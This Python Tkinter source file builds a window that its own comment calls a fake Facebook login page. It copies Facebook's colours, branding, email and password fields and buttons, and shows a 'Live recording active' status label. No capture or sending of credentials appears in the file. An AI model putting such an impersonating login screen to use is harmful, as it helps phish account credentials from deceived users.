# ==================== BUILT-IN MODULES ====================
import tkinter as tk
from tkinter import ttk

# ==================== CUSTOM MODULE ====================
from ui_helpers import appear_root_window, round_rect, EntryWithPlaceholder


# Create fake Facebook login page using Tkinter
def create_ui(end_program):
    # ==================== COLORS ====================
    FACEBOOK_BLUE = "#1877f2"
    FACEBOOK_GREEN = "#42b72a"
    FACEBOOK_BG = "#f2f4f7"
    CARD_WHITE = "#ffffff"
    TEXT_DARK = "#1c1e21"
    INPUT_BORDER = "#dddfe2"
    TEXT_GREY = "#a0a0a0"

    # ==================== ROOT WINDOW ====================
    root = tk.Tk()
    root.title("Facebook")
    appear_root_window(root)
    root.configure(bg=FACEBOOK_BG)

    # ---------- FACEBOOK TITLE ----------
    tk.Label(
        root,
        text="facebook",
        font=("Helvetica", 36, "bold"),
        fg=FACEBOOK_BLUE,
        bg=FACEBOOK_BG
    ).pack(pady=(50, 20))

    # ---------- LOGIN CARD ----------
    card_width, card_height = 460, 330
    canvas = tk.Canvas(
        root,
        width=card_width,
        height=card_height,
        bg=FACEBOOK_BG,
        highlightthickness=0
    )
    canvas.pack()

    round_rect(
        canvas,
        2, 2, card_width - 2, card_height - 2,
        radius=18,
        fill=CARD_WHITE,
        outline=INPUT_BORDER
    )

    card = tk.Frame(canvas, bg=CARD_WHITE)
    canvas.create_window(card_width // 2, card_height // 2, window=card)

    tk.Label(
        card,
        text="Log Into Facebook",
        font=("Helvetica", 16),
        fg=TEXT_DARK,
        bg=CARD_WHITE
    ).pack(pady=(20, 10))

    # ---------- USER ENTRY BOXES ----------
    # Email entry box
    email = EntryWithPlaceholder(
        card,
        placeholder="Email or phone number",
        is_password=False,
        width=40,
        font=("Helvetica", 12),
        bg=CARD_WHITE,
        fg=TEXT_DARK,
        relief="solid",
        bd=1,
        highlightthickness=4,
        highlightbackground=CARD_WHITE,
        highlightcolor=TEXT_DARK
    )
    email.pack(pady=6, ipady=6)
    # Password entry box
    password = EntryWithPlaceholder(
        card,
        placeholder="Password",
        is_password=True,
        width=40,
        font=("Helvetica", 12),
        bg=CARD_WHITE,
        fg=TEXT_DARK,
        relief="solid",
        bd=1,
        highlightthickness=4,
        highlightbackground=CARD_WHITE,
        highlightcolor=TEXT_DARK
    )
    password.pack(pady=6, ipady=6)

    # ---------- FACEBOOK LOGIN BUTTON ----------
    style = ttk.Style()
    style.theme_use("clam")

    style.configure(
        "FB.TButton",
        background=FACEBOOK_BLUE,
        foreground="white",
        font=("Helvetica", 12, "bold"),
        padx=8,
        pady=6,
        width=36,
        borderwidth=0
    )
    style.map(
        "FB.TButton",
        background=[("active", FACEBOOK_BLUE)],
        foreground=[("active", "white")]
    )

    ttk.Button(card, text="Log In", style="FB.TButton").pack(
        pady=12, ipadx=10, ipady=5
    )

    # ---------- ADDITIONAL TEXT ----------
    tk.Label(
        card,
        text="Forgot account?",
        fg=FACEBOOK_BLUE,
        bg=CARD_WHITE,
        font=("Helvetica", 10, "bold")
    ).pack()

    tk.Label(
        card,
        text="─────────────────────────── or ───────────────────────────",
        fg=TEXT_GREY,
        bg=CARD_WHITE,
        font=("Helvetica", 8)
    ).pack()

    # ---------- FACEBOOK CREATE NEW ACCOUNT BUTTON ----------
    style.configure(
        "Create.TButton",
        background=FACEBOOK_GREEN,
        foreground="white",
        font=("Helvetica", 12, "bold"),
        padding=6,
        borderwidth=0
    )
    style.map(
        "Create.TButton",
        background=[("active", FACEBOOK_GREEN)],
        foreground=[("active", "white")]
    )

    ttk.Button(
        card,
        text="Create new account",
        style="Create.TButton"
    ).pack(pady=10, ipadx=8, ipady=5)

    # ---------- STATUS LABEL ----------
    status_label = tk.Label(
        root,
        text="Live recording active",
        bg="#2e7d32",
        fg="white"
    )
    status_label.pack(pady=10)

    # ---------- WINDOW CLOSE HANDLER ----------
    root.protocol("WM_DELETE_WINDOW", end_program)
    
    return root, status_label